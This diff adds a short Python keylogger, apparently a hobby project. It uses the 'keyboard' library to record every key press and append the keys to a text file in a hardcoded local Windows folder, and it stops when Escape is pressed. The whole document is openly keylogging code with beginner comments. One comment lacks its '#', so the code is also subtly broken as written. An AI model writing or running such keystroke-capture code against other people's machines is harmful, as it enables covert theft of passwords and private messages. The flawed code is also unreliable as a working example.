@@ -1,0 +1,30 @@
+import os #import OS library
+import keyboard #import Keyboard library
+
+def create_folder(): #def the funtions that will create a folder 
+    folder_path = "C:\\Users\\simsi\\Desktop\\desktop\\PY Projects\\keybored" #enter your own local path here
+    os.makedirs(folder_path, exist_ok=True) #creates folder
+    print("Folder Created") #This is optional to confirm a folder has been created
+
+def key_logger(e): #define the function that will log keys
+    keys_logged = [] #creates a list called keys_logged
+    key = e.name
+    if e.event_type == keyboard.KEY_DOWN: checks if a key is pressed down
+         keys_logged.append(key) #appends the pressed key to the list created
+         write_to_file(keys_logged) #sends the Keys logged to the below function to write to file
+
+def write_to_file(keys): #def the function that will write the keys to a file
+    file_path = "C:\\Users\\simsi\\Desktop\\desktop\\PY Projects\\keybored\\logged_text.txt" #local path to the file you wanted created
+    with open(file_path, "a") as file: #open the file created
+        for key in keys: #iterate through the list of pressed keys
+
+            if key == "space": #this is for easier readibility within the log file
+               file.write(" ")
+            else:
+               file.write(str(key))
+
+create_folder() #callout funciton to be executed
+
+keyboard.hook(key_logger) #capture keys defined in function
+
+keyboard.wait('esc') #tells the program if escape is pressed to quit
